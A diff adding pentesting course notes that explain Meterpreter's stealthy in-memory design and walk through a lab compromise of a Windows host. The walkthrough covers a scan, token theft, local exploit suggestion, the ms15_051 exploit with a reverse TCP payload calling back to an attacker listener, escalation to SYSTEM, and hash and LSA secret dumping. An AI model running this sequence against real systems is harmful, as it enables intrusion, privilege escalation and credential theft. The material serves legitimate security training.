@@ -512,3 +512,202 @@ use exploit/linux/local/sudo_baron_samedit
 run
 # We got a root session (WE ARE IN)
 ```
+# Meterpreter
+
+The `Meterpreter` Payload is a specific type of multi-faceted, extensible Payload that uses `DLL injection` to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.
+It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.
+## Running Meterpreter
+
+To run Meterpreter, we only need to select any version of it from the `show payloads` output, taking into consideration the type of connection and OS we are attacking.
+
+When the exploit is completed, the following events occur:
+
+- The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
+- The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
+- The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
+- Lastly, Meterpreter loads extensions. It will always load `stdapi` and load `priv` if the module gives administrative rights. All of these extensions are loaded over AES encryption.
+
+Whenever the Meterpreter Payload is sent and run on the target system, we receive a `Meterpreter shell`. We can then immediately issue the `help` command to see what the Meterpreter shell is capable of.
+## Stealthy
+
+Meterpreter, when launched and after arriving on the target, resides entirely in memory and writes nothing to the disk. No new processes are created either as Meterpreter injects itself into a compromised process. Moreover, it can perform process migrations from one running process to another.
+
+With the now updated msfconsole-v6, all Meterpreter payload communications between the target host and us are encrypted using AES to ensure confidentiality and integrity of data communications.
+
+All of these provide limited forensic evidence to be found and also little impact on the victim machine.
+## Powerful
+
+Meterpreter's use of a channelized communication system between the target host and the attacker proves very useful. We can notice this first-hand when we immediately spawn a host-OS shell inside of our Meterpreter stage by opening a dedicated channel for it. This also allows for the use of AES-encrypted traffic.
+## Extensible
+
+Meterpreter's features can constantly be augmented at runtime and loaded over the network. Its modular structure also allows new functionality to be added without rebuilding it.
+## Using Meterpreter
+
+We have already delved into the basics of Meterpreter in the Payloads section. Now, we will look at the real strengths of the Meterpreter shell and how it can bolster the assessment's effectiveness and save time during an engagement. We start by running a basic scan against a known target. We will do this a-la-carte, doing everything from inside msfconsole to benefit from the data tracking on our target.
+#### MSF - Scanning Target
+
+```shell
+db_nmap -sV -p- -T5 -A 10.10.10.15
+```
+#### MSF - Meterpreter Migration
+
+```shell
+meterpreter > getuid
+[-] 1055: Operation failed: Access is denied.
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name              Arch  Session  User                          Path
+ ---   ----  ----              ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System
+ 216   1080  cidaemon.exe
+ 272   4     smss.exe
+ 292   1080  cidaemon.exe
+ <...SNIP...>
+ 1712  396   alg.exe
+ 1836  592   wmiprvse.exe      x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1920  396   dllhost.exe
+ 2232  3552  svchost.exe       x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
+ 2312  592   wmiprvse.exe
+ 3552  1460  w3wp.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 3624  592   davcdata.exe      x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 4076  1080  cidaemon.exe
+
+meterpreter > steal_token 1836
+Stolen token with username: NT AUTHORITY\NETWORK SERVICE
+
+meterpreter > getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+```
+
+Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the `C:\Inetpub\` location, we find an interesting folder named `AdminScripts`. However, unfortunately, we do not have permission to read what is inside it.
+#### MSF - Interacting with the Target
+
+```shell
+c:\Inetpub>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 246C-D7FE
+
+ Directory of c:\Inetpub
+
+04/12/2017  05:17 PM    <DIR>          .
+04/12/2017  05:17 PM    <DIR>          ..
+04/12/2017  05:16 PM    <DIR>          AdminScripts
+09/03/2020  01:10 PM    <DIR>          wwwroot
+               0 File(s)              0 bytes
+               4 Dir(s)  18,125,160,448 bytes free
+
+c:\Inetpub>cd AdminScripts
+cd AdminScripts
+Access is denied.
+```
+#### MSF - Session Handling
+
+```shell
+meterpreter > bg
+Background session 1? [y/N]  y
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank    Check  Description
+   -  ----                                       ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                    normal  No     Multi Recon Local Exploit Suggester
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 34 exploit checks are being tried...
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+
+msf6 post(multi/recon/local_exploit_suggester) >
+```
+
+Running the recon module presents us with a multitude of options. Going through each separate one, we land on the `ms15_051_client_copy_image` entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.
+#### MSF - Privilege Escalation
+
+```shell
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
+
+Module options (exploit/windows/local/ms15_051_client_copy_image):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
+session => 1
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
+LHOST => tun0
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > run
+
+[*] Started reverse TCP handler on 10.10.14.26:4444
+[*] Launching notepad to host the exploit...
+[+] Process 844 launched.
+[*] Reflectively injecting the exploit DLL into 844...
+[*] Injecting exploit into 844...
+[*] Exploit injected. Injecting payload into 844...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175174 bytes) to 10.10.10.15
+[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+From here, we can proceed to use the plethora of Meterpreter functionalities. For example, extracting hashes, impersonating any process we want, and others.
+#### MSF - Dumping Hashes
+
+```shell
+hashdump
+lsa_dump_sam
+
+lsa_dump_secrets
+```
+## Exercise
